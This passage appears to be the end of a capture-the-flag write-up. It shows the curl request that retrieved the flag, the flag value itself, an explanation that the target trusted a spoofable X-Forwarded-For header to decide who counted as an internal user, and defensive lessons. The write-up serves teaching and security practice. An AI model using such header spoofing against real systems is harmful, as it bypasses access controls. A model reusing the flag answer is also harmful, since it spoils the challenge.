7. Retrieving the Flag
The flag was retrieved using:
curl http://3.253.24.120/2kf84qoqi6sviu7poeu54p9b/flag.txt
Flag:
5bdd59d4-2ab4-4a30-af10-534e35e7065d
________________________________________
8. Vulnerability Explanation
The vulnerability was caused by trusting the user-controlled header:
X-Forwarded-For
The application assumed this value represented the real client IP.
An attacker could modify this header and appear as an internal company user.
________________________________________
9. Lessons Learned
Key takeaways:
•	Never trust client-controlled headers for authentication decisions.
•	IP-based access control should rely on trusted network infrastructure.
•	Always validate authentication separately from IP information.
•	Enumeration + understanding application logic is often more effective than brute force.
